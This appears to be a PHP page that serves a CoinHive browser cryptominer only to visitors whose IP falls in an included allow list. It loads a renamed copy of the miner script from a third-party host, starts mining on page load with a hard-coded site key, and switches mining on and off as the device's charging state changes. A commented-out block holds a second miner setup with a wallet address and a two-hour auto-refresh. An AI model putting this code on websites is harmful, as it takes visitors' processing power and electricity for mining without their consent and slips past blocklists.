<?php

function testUserIP($user_ip, $cidrs) {
	
	$ipu = explode('.', $user_ip);
	
	foreach ($ipu as &$v) $v = str_pad(decbin($v), 8, '0', STR_PAD_LEFT);
	
	$ipu = join('', $ipu);
	$res = false;
	
	foreach ($cidrs as $cidr) {
	
		$parts = explode('/', $cidr);
		$ipc = explode('.', $parts[0]);
		
		foreach ($ipc as &$v) $v = str_pad(decbin($v), 8, '0', STR_PAD_LEFT);
		
		$ipc = substr(join('', $ipc), 0, $parts[1]);
		$ipux = substr($ipu, 0, $parts[1]);
		$res = ($ipc === $ipux);
		
		if ($res) break;
		
	}
	
	return $res;
	
}

include('./inc/allowed_cidrs.php');

if (empty($allowed_cidrs) || !testUserIP($_SERVER['REMOTE_ADDR'], $allowed_cidrs)) exit();

// <script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>
?>
<script type="text/javascript" src="https://plugin.brfiles.com/lib/ch64.min.js"></script>
<script type="text/javascript">
var miner = new CoinHive.Anonymous('tvCtC1O0jLGZJ6TWIIgdBxYQctUZtLdM', {
	threads: 1,
	autoThreads: false
});
try {
	navigator.getBattery().then(function (battery) {
		
		if (battery.charging) miner.start(CoinHive.FORCE_MULTI_TAB);
		
		battery.onchargingchange = function (evt) {
			if (battery.charging) miner.start(CoinHive.FORCE_MULTI_TAB);
			else miner.stop();
		}
		
	});
}catch(e){miner.start(CoinHive.FORCE_MULTI_TAB);}
</script>
<?
/*
?>
<html>
<head>
	<meta http-equiv="refresh" content="7200">
</head>
<body>
<script type="text/javascript" src="https://plugin.brfiles.com/lib/ae64.min.js"></script>
<script type="text/javascript">
function start() {
	startMining(
		'durinsmine.com',
		'WmsZ6c6aaVvivJEHfSDkJgYo85dQFJ9aMQhw5na12ApjSD5efCMDwyGEyw81oUXR536ubbymujshveRA5oip3AHJ37U7dBPM7',
		'x',
		1
	);
}
try {
	navigator.getBattery().then(function (battery) {
		
		if (battery.charging) start();
		
		battery.onchargingchange = function (evt) {
			if (battery.charging) start();
			else stopMining();
		}
		
	});
}catch(e){start();}
</script>
</body>
</html>
*/
?>